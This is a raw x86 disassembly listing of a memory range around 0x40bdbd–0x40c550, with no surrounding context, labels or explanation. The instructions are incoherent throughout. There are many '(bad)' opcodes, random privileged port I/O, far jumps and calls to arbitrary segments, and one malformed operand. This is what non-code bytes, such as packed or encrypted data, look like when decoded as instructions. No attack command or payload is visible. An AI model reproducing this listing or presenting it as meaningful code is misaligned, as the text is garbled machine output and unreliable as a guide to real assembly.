  40bdbd:	xor    BYTE PTR ds:0xc3f242e5,ah
  40bdc3:	lds    eax,FWORD PTR [ebp+0x6c]
  40bdc6:	cwde   
  40bdc7:	jno    0x40bdb3
  40bdc9:	push   0x9e88a11c
  40bdce:	adc    dh,BYTE PTR [ecx+0x6799f419]
  40bdd4:	jg     0x40bd5f
  40bdd6:	lods   al,BYTE PTR ds:[esi]
  40bdd7:	or     esi,ebx
  40bdd9:	in     eax,dx
  40bdda:	dec    ecx
  40bddb:	adc    eax,0x8f30d3ec
  40bde0:	inc    ecx
  40bde1:	fs clc 
  40bde3:	in     eax,dx
  40bde4:	jns    0x40bdea
  40bde6:	loopne 0x40bdf1
  40bde8:	in     al,0x73
  40bdea:	or     bh,BYTE PTR [edi-0x778ad91e]
  40bdf0:	test   BYTE PTR [ebp-0x41],ah
  40bdf3:	scas   eax,DWORD PTR es:[edi]
  40bdf4:	dec    edx
  40bdf5:	xor    DWORD PTR [esi-0x50d976bb],edi
  40bdfb:	popa   
  40bdfc:	bound  edx,QWORD PTR [edx]
  40bdfe:	xlat   BYTE PTR ds:[ebx]
  40bdff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be00:	aas    
  40be01:	inc    esp
  40be02:	push   esp
  40be03:	call   0xf7c8:0x2d5408d6
  40be0a:	retf   0x5cbb
  40be0d:	retf   0xf52d
  40be10:	push   es
  40be11:	lods   al,BYTE PTR ds:[esi]
  40be12:	adc    dh,BYTE PTR [edi]
  40be14:	and    dh,dl
  40be16:	not    BYTE PTR [edx]
  40be18:	mov    edx,0x64b49917
  40be1d:	pop    ds
  40be1e:	push   esi
  40be1f:	dec    edx
  40be20:	inc    ebx
  40be21:	xchg   ebx,eax
  40be22:	sbb    BYTE PTR ds:0x553a7254,bh
  40be28:	inc    ebx
  40be29:	loop   0x40bdb6
  40be2b:	mov    eax,0x67dda009
  40be30:	mov    ?,WORD PTR [esi-0x1e0e9467]
  40be36:	push   0x41
  40be38:	out    0x73,eax
  40be3a:	stc    
  40be3b:	or     edx,DWORD PTR [ebp-0x54]
  40be3e:	in     eax,dx
  40be3f:	test   al,0x1a
  40be41:	jmp    0xfb580a87
  40be46:	xor    al,0x16
  40be48:	std    
  40be49:	add    BYTE PTR [ecx],0x68
  40be4c:	mov    esi,0x5550f7b1
  40be51:	js     0x40be2a
  40be53:	fdiv   QWORD PTR [esi-0x3b4059ce]
  40be59:	xor    BYTE PTR [edx-0x427198bf],ch
  40be5f:	dec    ebp
  40be60:	sub    DWORD PTR [eax-0x21],ebp
  40be63:	popa   
  40be64:	cmp    al,0x53
  40be66:	rcl    edi,0xb9
  40be69:	or     DWORD PTR [edx+edx*4],ecx
  40be6c:	mov    edi,0x41c8d779
  40be71:	pop    eax
  40be72:	mov    ecx,0x491690fb
  40be77:	jl     0x40be4b
  40be79:	test   BYTE PTR [ebp+0x2d],0x8a
  40be7d:	pop    es
  40be7e:	push   cs
  40be7f:	das    
  40be80:	pop    edi
  40be81:	(bad)  
  40be82:	jns    0x40be47
  40be84:	xlat   BYTE PTR ds:[ebx]
  40be85:	rol    DWORD PTR [edi],1
  40be87:	in     eax,dx
  40be88:	dec    edx
  40be89:	rcl    DWORD PTR [ebx],0xf1
  40be8c:	inc    ebx
  40be8d:	lods   eax,DWORD PTR ds:[esi]
  40be8e:	sub    DWORD PTR [edx],ebx
  40be90:	ror    BYTE PTR [ecx+0x4c8c6da6],0x73
  40be97:	mov    ds,WORD PTR [edi+0x612c4215]
  40be9d:	imul   esp,DWORD PTR [ecx+eax*2],0x3
  40bea1:	fiadd  DWORD PTR ds:0xdcb34ffd
  40bea7:	add    al,0x3f
  40bea9:	push   ss
  40beaa:	or     DWORD PTR [edi+0x6a],ecx
  40bead:	mov    dh,0x59
  40beaf:	mov    eax,ds:0x82ee53a1
  40beb4:	shl    BYTE PTR [edi],cl
  40beb6:	loop   0x40be38
  40beb8:	add    dh,ch
  40beba:	imul   edi,DWORD PTR [ebx],0xe8851a40
  40bec0:	sub    ebx,edi
  40bec2:	scas   al,BYTE PTR es:[edi]
  40bec3:	fdivr  QWORD PTR [eax-0x10160bb1]
  40bec9:	out    0xad,al
  40becb:	icebp  
  40becc:	jno    0x40beec
  40bece:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40becf:	inc    ebp
  40bed0:	aam    0x0
  40bed2:	sahf   
  40bed3:	push   edx
  40bed4:	dec    edi
  40bed5:	ins    DWORD PTR es:[edi],dx
  40bed6:	inc    ecx
  40bed7:	mov    ch,BYTE PTR [ecx+0x3f]
  40beda:	push   ds
  40bedb:	nop
  40bedc:	pop    ebx
  40bedd:	add    DWORD PTR [edx+0x25ec192f],ebx
  40bee3:	repnz pop eax
  40bee5:	(bad)  
  40bee6:	call   0x7fb4655c
  40beeb:	ins    DWORD PTR es:[edi],dx
  40beec:	jp     0x40bf62
  40beee:	or     DWORD PTR [edi+edx*8+0x64],ebp
  40bef2:	ss or  ebx,edx
  40bef5:	jecxz  0x40befb
  40bef7:	repz sti 
  40bef9:	mov    ebp,0x5783f9d5
  40befe:	xchg   esi,eax
  40beff:	stc    
  40bf00:	mov    eax,ds:0x2929d7d4
  40bf05:	cwde   
  40bf06:	fcomp  QWORD PTR [ebx]
  40bf08:	sub    ebp,DWORD PTR [esi-0x62fcd790]
  40bf0e:	ins    DWORD PTR es:[edi],dx
  40bf0f:	inc    ebp
  40bf10:	push   ebp
  40bf11:	fadd   QWORD PTR [ecx+0x24d69de1]
  40bf17:	int3   
  40bf18:	dec    ebp
  40bf19:	mov    bl,0x73
  40bf1b:	cmp    DWORD PTR [esi],ecx
  40bf1d:	jle    0x40bf16
  40bf1f:	or     eax,DWORD PTR [edx+0x1873171e]
  40bf25:	jl     0x40bf1d
  40bf27:	xor    DWORD PTR [edx+0x441440db],ebx
  40bf2d:	enter  0x9765,0xa5
  40bf31:	sbb    eax,0x5d4b1a43
  40bf36:	mov    gs:0x92733429,eax
  40bf3c:	jnp    0x40bf76
  40bf3e:	fidivr DWORD PTR [esi-0x1eb25f77]
  40bf44:	rcr    cl,cl
  40bf46:	div    dl
  40bf48:	call   0x69cabb8b
  40bf4d:	outs   dx,BYTE PTR ds:[esi]
  40bf4e:	lea    esi,[edi+0x7c]
  40bf51:	jnp    0x40bf15
  40bf53:	ins    DWORD PTR es:[edi],dx
  40bf54:	adc    al,0xf
  40bf57:	es lahf 
  40bf59:	and    edi,ebp
  40bf5b:	out    dx,eax
  40bf5c:	mov    cl,dl
  40bf5e:	pop    ebp
  40bf5f:	mov    cl,0xe4
  40bf61:	xchg   ebx,eax
  40bf62:	call   0x58ae79ff
  40bf67:	xchg   ebp,eax
  40bf68:	or     eax,0x432fa414
  40bf6d:	mov    ah,0xd9
  40bf6f:	add    DWORD PTR [esi-0x33],0xd3505ba4
  40bf76:	cld    
  40bf77:	sbb    DWORD PTR [edi+0x3c],eax
  40bf7a:	scas   eax,DWORD PTR es:[edi]
  40bf7b:	jl     0x40bf3b
  40bf7d:	pop    ebx
  40bf7e:	imul   esi,esp,0xec4e9c29
  40bf84:	popa   
  40bf85:	pop    esi
  40bf86:	xchg   ebp,eax
  40bf87:	retf   0xb531
  40bf8a:	push   ds
  40bf8b:	xor    eax,0xd93a165a
  40bf90:	in     eax,0x6a
  40bf92:	ret    
  40bf93:	enter  0x1b90,0x95
  40bf97:	cmp    DWORD PTR [eax-0x64488bba],edx
  40bf9d:	xchg   esi,eax
  40bf9e:	mov    WORD PTR [ebx+edi*2],cs
  40bfa1:	call   0x24fe533c
  40bfa6:	fidiv  DWORD PTR [eax-0x3]
  40bfa9:	aaa    
  40bfaa:	cmp    ebx,ebx
  40bfac:	in     al,dx
  40bfad:	call   0x5456:0x49da82d2
  40bfb4:	popa   
  40bfb5:	enter  0x1fd4,0xdc
  40bfb9:	loope  0x40bf63
  40bfbb:	inc    ebp
  40bfbc:	scas   al,BYTE PTR es:[edi]
  40bfbd:	stos   DWORD PTR es:[edi],eax
  40bfbe:	fs pop esp
  40bfc0:	pop    edi
  40bfc1:	fwait
  40bfc2:	and    edx,ebx
  40bfc4:	add    ah,dl
  40bfc6:	or     dl,dh
  40bfc8:	mov    al,0x7e
  40bfca:	mov    eax,0x810bfc3c
  40bfcf:	or     DWORD PTR [edx-0x28],esi
  40bfd2:	xor    eax,0x941388f7
  40bfd7:	xor    edx,DWORD PTR [eax]
  40bfd9:	sub    BYTE PTR [edx-0x9b44d9b],dl
  40bfdf:	sub    al,0x10
  40bfe1:	jo     0x40bf6d
  40bfe3:	sub    eax,0x3c54d375
  40bfe8:	icebp  
  40bfe9:	pop    ecx
  40bfea:	jae    0x40bff1
  40bfec:	jl     0x40bf70
  40bfee:	sbb    BYTE PTR [edi+0x570be1ca],al
  40bff4:	neg    DWORD PTR [ebx-0x233fe3bd]
  40bffa:	aas    
  40bffb:	xor    DWORD PTR [ebp-0x466497cf],edx
  40c001:	add    cl,dh
  40c003:	xlat   BYTE PTR ds:[ebx]
  40c004:	sahf   
  40c005:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40c007:	push   esp
  40c008:	mov    bh,0x25
  40c00a:	retf   
  40c00b:	lahf   
  40c00c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c00d:	jmp    0xa22a:0x879908c2
  40c014:	dec    esi
  40c015:	jmp    0x519e82f8
  40c01a:	mov    cl,0xa4
  40c01c:	mov    ebx,DWORD PTR [edx]
  40c01e:	jae    0x40bfb1
  40c020:	pop    ss
  40c021:	and    esi,DWORD PTR [ebx]
  40c023:	rcl    ebp,0xe6
  40c026:	mov    BYTE PTR [ebx+edi*1+0x568d53c0],dl
  40c02d:	adc    DWORD PTR [ecx-0x36],eax
  40c030:	sbb    eax,0xd98860c8
  40c035:	retf   0x113e
  40c038:	inc    eax
  40c039:	in     al,dx
  40c03a:	cli    
  40c03b:	pop    esi
  40c03c:	pop    es
  40c03d:	imul   eax
  40c03f:	leave  
  40c040:	loop   0x40c052
  40c042:	test   BYTE PTR [edx-0x7948db73],0x7b
  40c049:	aas    
  40c04a:	daa    
  40c04b:	(bad)  
  40c04c:	icebp  
  40c04d:	jnp    0x40c0a7
  40c04f:	add    eax,DWORD PTR [edi-0x51]
  40c052:	sub    ecx,DWORD PTR [ecx-0x4b]
  40c055:	pop    eax
  40c056:	movd   mm7,DWORD PTR ds:0xbc43072
  40c05d:	(bad)  
  40c05e:	rcr    DWORD PTR [edi+0x9d7d793],cl
  40c064:	ja     0x40c0d5
  40c066:	ins    BYTE PTR es:[edi],dx
  40c067:	repz jl 0x40c0ac
  40c06a:	sbb    ebp,DWORD PTR [edi-0x41cce36d]
  40c070:	call   0xe22e:0xb55ab82e
  40c077:	adc    al,0x23
  40c079:	xchg   esi,eax
  40c07a:	jl     0x40c0ca
  40c07c:	rol    BYTE PTR [eax-0x2022f0a7],cl
  40c082:	dec    esi
  40c083:	mov    al,0xdf
  40c085:	xchg   esi,eax
  40c086:	or     al,0xee
  40c088:	loopne 0x40c0bf
  40c08a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c08b:	push   esp
  40c08c:	pop    edi
  40c08d:	aaa    
  40c08e:	sar    BYTE PTR [edx+0x2079627f],1
  40c094:	jne    0x40c0d5
  40c096:	mov    BYTE PTR [esi],al
  40c098:	add    BYTE PTR gs:[esp+ebp*4-0x702ad7eb],bl
  40c0a0:	add    DWORD PTR [ebp+0x3687fc4c],esp
  40c0a6:	dec    esp
  40c0a7:	idiv   BYTE PTR [ebp+0x32e4162e]
  40c0ad:	outs   dx,DWORD PTR ds:[esi]
  40c0ae:	je     0x40c050
  40c0b0:	repnz xchg esi,eax
  40c0b2:	dec    ebx
  40c0b3:	rcl    BYTE PTR [ebp-0x7b],1
  40c0b6:	ror    ebx,cl
  40c0b8:	(bad)  
  40c0b9:	and    BYTE PTR [ecx+0x1b701810],cl
  40c0bf:	arpl   WORD PTR [ecx+0x4c],cx
  40c0c2:	in     al,dx
  40c0c3:	es push esp
  40c0c5:	lahf   
  40c0c6:	sbb    edx,edi
  40c0c8:	push   ecx
  40c0c9:	xor    al,0x9f
  40c0cb:	cmp    al,BYTE PTR [edi-0x72]
  40c0ce:	mov    edx,esi
  40c0d0:	pusha  
  40c0d1:	add    al,ah
  40c0d3:	mov    ah,0x9e
  40c0d5:	lods   al,BYTE PTR ds:[esi]
  40c0d6:	xchg   ecx,eax
  40c0d7:	sbb    al,0xd6
  40c0d9:	ror    ecx,cl
  40c0db:	xor    al,0x2c
  40c0dd:	jmp    0xf254de2a
  40c0e2:	or     al,0xac
  40c0e4:	or     ebp,DWORD PTR [edx+0x70]
  40c0e7:	imul   esi,DWORD PTR [edx],0xffffffa0
  40c0ea:	xchg   BYTE PTR [edx+0x1dff7068],cl
  40c0f0:	outs   dx,DWORD PTR ds:[esi]
  40c0f1:	dec    edx
  40c0f2:	push   eax
  40c0f3:	pop    ds
  40c0f4:	adc    ecx,DWORD PTR [ebx+0x2d59c83a]
  40c0fa:	push   ds
  40c0fb:	imul   esp,DWORD PTR [edx-0x1f9e3406],0x57
  40c102:	jg     0x40c134
  40c104:	test   DWORD PTR [ebp+0x19233827],ebx
  40c10a:	mov    bh,0xcd
  40c10c:	or     DWORD PTR [edx+0x39],edx
  40c10f:	fstp   TBYTE PTR [ecx+ecx*1]
  40c112:	in     eax,0xbf
  40c114:	mov    eax,0x8a6db709
  40c119:	fild   DWORD PTR ds:0xd0f1146
  40c11f:	das    
  40c120:	es pop edx
  40c122:	add    bh,dh
  40c124:	daa    
  40c125:	sub    DWORD PTR [ebx],0x9b842e08
  40c12b:	test   al,0x64
  40c12d:	es push edx
  40c12f:	mov    bh,0x76
  40c131:	and    al,0xa9
  40c133:	fwait
  40c134:	xor    al,0xd7
  40c136:	gs or  eax,0x99d1cbb5
  40c13c:	out    0x54,eax
  40c13e:	dec    ecx
  40c13f:	push   ebx
  40c140:	loop   0x40c105
  40c142:	mov    edi,0x37fe659
  40c147:	clc    
  40c148:	cmc    
  40c149:	mov    esi,0xccc38176
  40c14e:	lea    edx,[eax]
  40c150:	pop    ebx
  40c151:	repnz test al,0x7f
  40c154:	rcl    DWORD PTR [edi+0x7149f2c8],1
  40c15a:	xor    al,0x41
  40c15c:	fcom   DWORD PTR [esi]
  40c15e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c15f:	and    eax,DWORD PTR [eax-0x6]
  40c162:	mov    al,0xae
  40c164:	push   ecx
  40c165:	sub    BYTE PTR [edi-0x6efa464d],0xac
  40c16c:	rol    DWORD PTR [edx+0x5ef547b7],1
  40c172:	xchg   cl,dh
  40c174:	xor    bh,al
  40c176:	xchg   edi,eax
  40c177:	fxch   st(6)
  40c179:	daa    
  40c17a:	imul   esp,DWORD PTR [eax+0x51],0x3f91d6b5
  40c181:	push   esp
  40c182:	sub    eax,0x601c0e65
  40c187:	jne    0x40c17b
  40c189:	call   0x24a03213
  40c18e:	fbstp  TBYTE PTR [edx]
  40c190:	arpl   WORD PTR [ebx-0x48636321],sp
  40c196:	mov    BYTE PTR [edx+ebx*2],dl
  40c199:	mov    eax,ds:0xa813261d
  40c19e:	les    esp,FWORD PTR [ebp-0x11]
  40c1a1:	mov    bh,0x9c
  40c1a3:	jge    0x40c127
  40c1a5:	xchg   ecx,eax
  40c1a6:	adc    ch,bl
  40c1a8:	psadbw mm1,mm0
  40c1ab:	pop    esi
  40c1ad:	stos   DWORD PTR es:[edi],eax
  40c1ae:	mov    ebp,DWORD PTR [esi-0x13f58487]
  40c1b4:	inc    esi
  40c1b5:	push   0x28
  40c1b7:	cmp    BYTE PTR [edx-0x4124bfeb],dl
  40c1bd:	and    bl,dl
  40c1bf:	mov    ebp,0xd9ad8556
  40c1c4:	lods   eax,DWORD PTR ds:[esi]
  40c1c5:	and    ebx,DWORD PTR [esi]
  40c1c7:	pusha  
  40c1c8:	xchg   dx,ax
  40c1ca:	jmp    0x4885a2d
  40c1cf:	test   DWORD PTR [edi+ecx*8+0x56],ecx
  40c1d3:	out    dx,eax
  40c1d4:	pushf  
  40c1d5:	cs popf 
  40c1d7:	mov    ch,0x63
  40c1d9:	push   esi
  40c1da:	push   0xa8bcddf3
  40c1df:	mov    ebx,0xa132cd5
  40c1e4:	(bad)  cs:[ebp-0x71]
  40c1e8:	mov    BYTE PTR [eax],bh
  40c1ea:	mov    eax,ds:0x9d9542fa
  40c1ef:	and    DWORD PTR [edi],esi
  40c1f1:	inc    esi
  40c1f2:	dec    eax
  40c1f3:	pop    edi
  40c1f4:	iret   
  40c1f5:	push   esi
  40c1f6:	imul   BYTE PTR [edi+edx*8-0x28]
  40c1fa:	jmp    0x40c1a4
  40c1fc:	cmp    DWORD PTR [eax],edi
  40c1fe:	cmp    BYTE PTR ds:0x93b5b726,0x39
  40c205:	retf   0x9779
  40c208:	popf   
  40c209:	sub    bh,BYTE PTR [ebp+0x13]
  40c20c:	fwait
  40c20d:	inc    esp
  40c20f:	inc    ebx
  40c210:	mov    ds:0xad791dfc,al
  40c215:	jmp    0xb7a45c48
  40c21a:	dec    ecx
  40c21b:	in     eax,0xda
  40c21d:	add    al,0xa4
  40c21f:	int3   
  40c220:	hlt    
  40c221:	jp     0x40c249
  40c223:	sbb    esi,DWORD PTR [eax+0x53]
  40c226:	(bad)  
  40c227:	jns    0x40c1ad
  40c229:	je     0x40c268
  40c22b:	xor    eax,0xd833df66
  40c230:	pop    ds
  40c231:	test   eax,0xd21cba44
  40c236:	mov    ebx,0xbc82f56d
  40c23b:	push   esi
  40c23c:	mov    eax,0xee5b982a
  40c241:	test   eax,0xe9ab3b14
  40c246:	sar    BYTE PTR [esi+0x3cc3b391],1
  40c24c:	push   cs
  40c24d:	jg     0x40c241
  40c24f:	sbb    al,0x6a
  40c251:	stos   BYTE PTR es:[edi],al
  40c252:	or     al,0xd3
  40c254:	(bad)  
  40c255:	or     BYTE PTR [ebp-0x242dfd11],bl
  40c25b:	bound  ax,DWORD PTR [esi-0x6f]
  40c25f:	xor    al,0xe7
  40c261:	aas    
  40c262:	fwait
  40c263:	mov    esi,0xe3bfe94
  40c268:	sbb    al,0xaf
  40c26a:	jns    0x40c2e1
  40c26c:	retf   0x8860
  40c26f:	jmp    0x40c281
  40c271:	xchg   ebx,eax
  40c272:	cmp    BYTE PTR [edx+0x4ee99a89],0x3d
  40c279:	push   ecx
  40c27a:	lea    edi,[edi-0x268ae4b]
  40c280:	cmp    al,0x8b
  40c282:	sar    DWORD PTR [edx+0x6102e415],1
  40c288:	ins    DWORD PTR es:[edi],dx
  40c289:	nop
  40c28a:	ja     0x40c2d2
  40c28c:	sti    
  40c28d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c28e:	aad    0x2a
  40c290:	or     BYTE PTR [ecx+0x7e],cl
  40c293:	ins    DWORD PTR es:[edi],dx
  40c294:	adc    eax,0x73bbfa78
  40c299:	push   esi
  40c29a:	jns    0x40c2fb
  40c29c:	aam    0x8f
  40c29e:	push   cs
  40c29f:	pop    edx
  40c2a0:	stos   BYTE PTR es:[edi],al
  40c2a1:	loopne 0x40c297
  40c2a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2a4:	addr16 retf 0x2e9f
  40c2a8:	jns    0x40c2d0
  40c2aa:	add    BYTE PTR [edx+ebp*2+0x48758e76],0xb0
  40c2b2:	test   al,0xc
  40c2b4:	mov    esp,0x3f495b8
  40c2b9:	xchg   esi,eax
  40c2ba:	adc    al,0xcd
  40c2bc:	mov    ds:0x8b8c7ddf,eax
  40c2c1:	jns    0x40c293
  40c2c3:	pop    edi
  40c2c4:	jmp    0x6a44:0xb29c7a9
  40c2cb:	sub    ah,BYTE PTR [esi]
  40c2cd:	bound  eax,QWORD PTR [ebx+0x293ccd10]
  40c2d3:	mov    WORD PTR [edi+ecx*2-0x45],fs
  40c2d7:	(bad)  
  40c2d9:	and    al,0xd3
  40c2db:	pushf  
  40c2dc:	or     ecx,DWORD PTR [eax+0xd]
  40c2df:	or     al,0xb7
  40c2e1:	push   cs
  40c2e2:	imul   edi,eax,0x3aee8294
  40c2e8:	dec    esp
  40c2e9:	jl     0x40c315
  40c2eb:	add    eax,0x17b8af84
  40c2f0:	imul   edx,ecx,0x3b9ee503
  40c2f6:	mov    ecx,0x7d50c193
  40c2fb:	pop    edx
  40c2fc:	into   
  40c2fd:	cmp    BYTE PTR ds:0xdadec7f5,bl
  40c303:	mov    fs,ecx
  40c305:	mov    dh,BYTE PTR fs:[eax+edi*4+0x3b]
  40c30a:	call   0xd145fd87
  40c30f:	fsubr  DWORD PTR [edx]
  40c311:	cwde   
  40c312:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c313:	lea    esp,[ebx]
  40c315:	addr16 push ds
  40c317:	fwait
  40c318:	repnz enter 0xbb6f,0x87
  40c31d:	ins    BYTE PTR es:[edi],dx
  40c31e:	mov    edx,0x38d5a41f
  40c323:	dec    ebx
  40c324:	bound  ebp,QWORD PTR [eax]
  40c326:	mov    eax,ds:0x83c0645a
  40c32b:	jno    0x40c301
  40c32d:	in     al,dx
  40c32e:	and    eax,0x893fba90
  40c333:	cmp    DWORD PTR [edi-0x693c2788],esi
  40c339:	push   edx
  40c33a:	jmp    0xe51c:0xa04af362
  40c341:	jns    0x40c371
  40c343:	add    dl,BYTE PTR [eax-0xe]
  40c346:	std    
  40c347:	and    edi,DWORD PTR [eax+0x72e91a30]
  40c34d:	push   ebp
  40c34e:	add    DWORD PTR [esi-0x75],ebx
  40c351:	and    al,0x27
  40c353:	loope  0x40c3be
  40c355:	inc    ecx
  40c356:	pop    es
  40c357:	sub    BYTE PTR [esp+eiz*2+0x5b3a9b94],dl
  40c35e:	mov    dh,bl
  40c360:	fidiv  DWORD PTR [eax+edx*2-0x4b]
  40c364:	push   edi
  40c365:	xchg   esi,eax
  40c366:	jae    0x40c370
  40c368:	nop
  40c369:	push   ebp
  40c36a:	inc    ecx
  40c36b:	xchg   ah,dh
  40c36d:	mov    ebx,0xf579fee7
  40c372:	xor    BYTE PTR [edx],bl
  40c374:	xor    BYTE PTR [edx+0x79faa410],bl
  40c37a:	int3   
  40c37b:	mov    bh,0xa
  40c37d:	int    0x77
  40c37f:	mov    ch,0xca
  40c381:	push   ds
  40c382:	cmp    DWORD PTR [eax],esp
  40c384:	mov    DWORD PTR [ebx-0x3614bf28],esi
  40c38a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c38b:	mov    bh,0xa5
  40c38d:	lahf   
  40c38e:	xchg   ecx,eax
  40c38f:	dec    esp
  40c390:	dec    edx
  40c391:	push   es
  40c392:	jne    0x40c333
  40c394:	add    DWORD PTR [edi+0x3f],0x85130e02
  40c39b:	fbld   TBYTE PTR [ecx+0x58]
  40c39e:	push   cs
  40c39f:	jge    0x40c370
  40c3a1:	push   ds
  40c3a2:	mov    cl,BYTE PTR [esi+0x46]
  40c3a5:	bound  ecx,QWORD PTR [ebp+esi*4+0x30ed9e69]
  40c3ac:	sub    esp,DWORD PTR [edx]
  40c3ae:	sbb    DWORD PTR [edi],ecx
  40c3b0:	aaa    
  40c3b1:	pushf  
  40c3b2:	mov    eax,ds:0xff58f04e
  40c3b7:	(bad)  
  40c3b8:	fwait
  40c3b9:	std    
  40c3ba:	repnz push 0x626abda5
  40c3c0:	aas    
  40c3c1:	rcr    DWORD PTR ds:0x689c6bb3,0x79
  40c3c8:	mov    gs,WORD PTR [ecx]
  40c3ca:	cmp    ebp,DWORD PTR [ecx+0x19]
  40c3cd:	ins    BYTE PTR es:[edi],dx
  40c3ce:	or     BYTE PTR [ecx+ebx*8-0x3e],bl
  40c3d2:	jp     0x40c38c
  40c3d4:	out    dx,al
  40c3d5:	mov    bh,0x48
  40c3d7:	rol    BYTE PTR [edi+edx*1-0x978be91],cl
  40c3de:	jecxz  0x40c38f
  40c3e0:	icebp  
  40c3e1:	mov    al,0x32
  40c3e3:	call   DWORD PTR [ebp+edi*8-0x67]
  40c3e7:	jp     0x40c43e
  40c3e9:	sub    ch,dl
  40c3eb:	jmp    0x46f5:0x44521b34
  40c3f2:	jns    0x40c3aa
  40c3f4:	jnp    0x40c449
  40c3f6:	int    0x33
  40c3f8:	mov    edx,0x862dfafe
  40c3fd:	les    ebx,FWORD PTR [esi]
  40c3ff:	jnp    0x40c42f
  40c401:	inc    ecx
  40c402:	inc    eax
  40c404:	nop
  40c405:	sahf   
  40c406:	jmp    0x8ca3293b
  40c40b:	cld    
  40c40c:	jge    0x40c3ce
  40c40e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c40f:	jle    0x40c3a4
  40c411:	add    BYTE PTR [ebx+0x9797248],cl
  40c417:	add    dh,ch
  40c419:	in     al,dx
  40c41a:	es dec edx
  40c41c:	lods   al,BYTE PTR ds:[esi]
  40c41d:	jnp    0x40c48e
  40c41f:	aaa    
  40c420:	adc    al,0xb5
  40c422:	dec    edi
  40c423:	shr    BYTE PTR [edx],1
  40c425:	sub    dh,bh
  40c427:	pcmpgtd mm5,QWORD PTR [ebp+0x65]
  40c42b:	clc    
  40c42c:	jge    0x40c4ab
  40c42e:	not    ebx
  40c430:	xchg   edi,eax
  40c431:	jp     0x40c408
  40c433:	push   ebp
  40c434:	icebp  
  40c435:	retf   
  40c436:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c437:	push   0xffffff8a
  40c439:	in     eax,dx
  40c43a:	lods   al,BYTE PTR ds:[esi]
  40c43b:	jb     0x40c4ad
  40c43d:	mov    bl,0x52
  40c43f:	adc    bl,BYTE PTR [esi-0x45678ee0]
  40c445:	rol    BYTE PTR [ebx+0x1faaaaf6],0x17
  40c44c:	ins    DWORD PTR es:[edi],dx
  40c44d:	ret    
  40c44e:	scas   eax,DWORD PTR es:[edi]
  40c44f:	fmul   DWORD PTR [ebx+0x12]
  40c452:	je     0x40c3fc
  40c454:	mov    BYTE PTR [eax-0x37],dl
  40c457:	fadd   QWORD PTR [eax+0x1a43234e]
  40c45d:	out    0x6d,eax
  40c45f:	mov    ebp,0xa9fafa76
  40c464:	test   DWORD PTR [edx],edx
  40c466:	aaa    
  40c467:	sbb    bl,BYTE PTR [ebp-0x68b4971c]
  40c46d:	push   es
  40c46e:	hlt    
  40c46f:	data16 mov al,ds:0xc7347ef0
  40c475:	mov    DWORD PTR [esi+0xf],edi
  40c478:	cmp    BYTE PTR [ecx-0x34],dl
  40c47b:	cdq    
  40c47c:	mov    BYTE PTR [ebp-0xa4c9192],cl
  40c482:	es mov al,0x6c
  40c485:	jmp    0x40c414
  40c487:	f2xm1  
  40c489:	in     al,dx
  40c48a:	leave  
  40c48b:	retf   0x8cb5
  40c48e:	sub    eax,0xcf5249f
  40c493:	add    al,0x62
  40c495:	in     al,dx
  40c496:	(bad)  
  40c497:	nop
  40c498:	fstp   QWORD PTR [esi+0x49]
  40c49b:	inc    ebx
  40c49c:	mul    DWORD PTR [ebx+ecx*8]
  40c49f:	inc    esi
  40c4a0:	adc    BYTE PTR [eax-0x5eb73212],al
  40c4a6:	fsubr  DWORD PTR [ecx+0x576cb64f]
  40c4ac:	(bad)  
  40c4ad:	repz leave 
  40c4af:	daa    
  40c4b0:	repnz and al,BYTE PTR [esi]
  40c4b3:	pop    edi
  40c4b4:	aam    0x37
  40c4b6:	daa    
  40c4b7:	mov    BYTE PTR [eax+0x68],al
  40c4ba:	push   ecx
  40c4bb:	mov    ebp,0xa673748
  40c4c0:	push   esp
  40c4c1:	pop    edi
  40c4c2:	outs   dx,DWORD PTR ds:[esi]
  40c4c3:	ret    
  40c4c4:	out    0x45,eax
  40c4c6:	or     eax,0x8377b2fe
  40c4cb:	or     ah,BYTE PTR [eax-0x6e0c679e]
  40c4d1:	push   eax
  40c4d2:	addr16 cmp eax,0x56b9aa65
  40c4d8:	mov    ds:0x3803bfca,al
  40c4dd:	scas   eax,DWORD PTR es:[edi]
  40c4de:	scas   eax,DWORD PTR es:[edi]
  40c4df:	test   BYTE PTR [eax-0x5a],0x6d
  40c4e3:	retf   0xf859
  40c4e6:	popf   
  40c4e7:	jmp    0x9336:0x5023da11
  40c4ee:	and    eax,esp
  40c4f0:	sub    edx,DWORD PTR [esi+0x4dc607b0]
  40c4f6:	push   ds
  40c4f7:	pop    edx
  40c4f8:	push   0x75
  40c4fa:	add    bl,bh
  40c4fc:	jno    0x40c53f
  40c4fe:	aam    0x94
  40c500:	xlat   BYTE PTR ds:[ebx]
  40c501:	inc    esi
  40c502:	loope  0x40c4a9
  40c504:	adc    ebx,ecx
  40c506:	shr    BYTE PTR ds:0xb5390c00,0x3f
  40c50d:	sbb    dh,bh
  40c50f:	xor    BYTE PTR [ebx],bl
  40c511:	ins    BYTE PTR es:[edi],dx
  40c512:	mov    edi,0xe2590c71
  40c517:	xlat   BYTE PTR ds:[ebx]
  40c518:	test   al,0x7
  40c51a:	in     eax,0x9b
  40c51c:	mov    eax,ds:0x45b2104e
  40c521:	cmp    eax,0xe07fe7cc
  40c526:	xor    BYTE PTR [ecx+0x52],0xf0
  40c52a:	test   DWORD PTR fs:[ecx+0x72],edi
  40c52e:	jnp    0x40c4df
  40c530:	aaa    
  40c531:	loopne 0x40c54a
  40c533:	push   ebp
  40c534:	cdq    
  40c535:	int    0x5d
  40c537:	dec    edi
  40c538:	(bad)  
  40c539:	out    0xc3,al
  40c53b:	inc    esp
  40c53c:	les    ecx,FWORD PTR [eax-0x4d2afaca]
  40c542:	pusha  
  40c543:	in     eax,0x46
  40c545:	jo     0x40c4ed
  40c547:	mov    dl,0xff
  40c549:	and    esp,DWORD PTR ds:0x48d74987
  40c54f:	(bad)  
  40c550:	shl    DWORD PTR [eax+edx*8],0xa9
